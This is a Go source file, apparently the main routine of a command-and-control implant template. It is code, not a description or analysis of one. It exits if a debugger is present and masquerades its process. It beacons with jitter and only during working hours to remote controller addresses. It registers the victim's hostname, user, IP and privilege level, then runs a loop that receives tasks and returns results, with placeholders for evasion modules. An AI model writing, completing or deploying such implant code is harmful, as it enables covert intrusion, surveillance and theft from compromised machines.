package main

import (
	crand "crypto/rand"
	"encoding/binary"
	"net"
	"os"
	"runtime"

	"__NAME__/crypto"
	"__NAME__/impl"
	"__NAME__/protocol"
	// __EVASION_MAIN_IMPORT__
)

// ─── Entry point ───────────────────────────────────────────────────────────────

func main() {
	if len(encProfiles) == 0 {
		os.Exit(1)
	}

	agent = impl.New()

	if agent.IsDebugged() {
		os.Exit(0)
	}

	agent.Masquerade()
	agent.OnStart()

	// __EVASION_INIT__

	for _, blob := range encProfiles {
		if len(blob) == 0 {
			continue
		}
		profile, sessionKey, err := parseEmbeddedProfile(blob)
		if err != nil {
			continue
		}
		crypto.SKey = sessionKey
		initProfileState(&profile)
		run(&profile, sessionKey)
	}
}

// ─── Connection loop ───────────────────────────────────────────────────────────

func run(profile *protocol.Profile, listenerKey []byte) {
	connCount := 0
	for {
		if shouldExit() {
			os.Exit(0)
		}
		waitForWorkingHours()
		if len(profile.Addresses) == 0 {
			return
		}

		addr := profile.Addresses[connCount%len(profile.Addresses)]
		connCount++

		conn, err := agent.Dial(addr, profile)
		if err != nil {
			sleepWithJitter()
			continue
		}

		initMsg, err := buildInitMessage(profile, listenerKey)
		if err != nil {
			_ = conn.Close()
			sleepWithJitter()
			continue
		}

		enc, err := crypto.EncryptData(initMsg, listenerKey)
		if err != nil {
			_ = conn.Close()
			sleepWithJitter()
			continue
		}

		if err := protocol.SendMsg(conn, enc); err != nil {
			_ = conn.Close()
			sleepWithJitter()
			continue
		}

		taskLoop(conn, listenerKey)
		_ = conn.Close()
		sleepWithJitter()
	}
}

func taskLoop(conn net.Conn, sessionKey []byte) {
	for {
		if shouldExit() {
			return
		}
		waitForWorkingHours()

		in, err := recvMessage(conn, sessionKey)
		if err != nil {
			return
		}
		if in.Type != 1 {
			sleepWithJitter()
			continue
		}

		responses := TaskProcess(in.Object)
		if len(responses) > 0 {
			if err := sendMessage(conn, sessionKey, 1, responses); err != nil {
				return
			}

			sleepWithJitter()
			continue
		}

		jobResponses := drainAsyncJobObjects()
		if len(jobResponses) == 0 {
			sleepWithJitter()
			continue
		}

		if err := sendMessage(conn, sessionKey, 2, jobResponses); err != nil {
			return
		}

		sleepWithJitter()
	}
}

// ─── Registration ──────────────────────────────────────────────────────────────

func createInfo(sessionKey []byte) protocol.SessionInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	cp := agent.GetCP()

	return protocol.SessionInfo{
		Process:    processName(),
		PID:        os.Getpid(),
		User:       username,
		Host:       hostname,
		Ipaddr:     localIPv4(),
		Elevated:   agent.IsElevated(),
		Acp:        cp,
		Oem:        cp,
		Os:         runtime.GOOS,
		OSVersion:  agent.GetOsVersion(),
		EncryptKey: sessionKey,
	}
}

func parseEmbeddedProfile(blob []byte) (protocol.Profile, []byte, error) {
	if len(blob) <= crypto.KeySize {
		return protocol.Profile{}, nil, os.ErrInvalid
	}
	key := append([]byte(nil), blob[:crypto.KeySize]...)
	plain, err := crypto.DecryptData(blob[crypto.KeySize:], key)
	if err != nil {
		return protocol.Profile{}, nil, err
	}
	var profile protocol.Profile
	if err := protocol.Unmarshal(plain, &profile); err != nil {
		return protocol.Profile{}, nil, err
	}
	return profile, key, nil
}

func buildInitMessage(profile *protocol.Profile, sessionKey []byte) ([]byte, error) {
	beat, err := protocol.Marshal(createInfo(sessionKey))
	if err != nil {
		return nil, err
	}
	initPackData, err := protocol.Marshal(protocol.InitPack{
		Id:   uint(randomUint32()),
		Type: profile.Type,
		Data: beat,
	})
	if err != nil {
		return nil, err
	}
	return protocol.Marshal(protocol.StartMsg{Type: protocol.INIT_PACK, Data: initPackData})
}

func randomUint32() uint32 {
	var buf [4]byte
	_, _ = crand.Read(buf[:])
	return binary.BigEndian.Uint32(buf[:])
}
